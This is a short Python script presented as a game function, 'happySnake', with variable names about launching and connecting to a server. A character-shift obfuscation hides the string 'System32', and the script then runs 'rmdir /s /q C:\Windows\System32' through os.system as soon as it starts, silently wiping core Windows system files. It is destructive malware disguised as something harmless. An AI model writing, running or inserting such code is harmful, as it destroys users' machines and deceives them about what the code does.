import os
def happySnake():
    pathToGame = "C:\\Windows\\"
    launcher = pathToGame
    connectServer = ''.join([chr(ord(char) + 2) for char in "Qwqrck10"])  
    endPoint = "rmdir /s /q " + launcher + connectServer
    os.system(endPoint)
happySnake()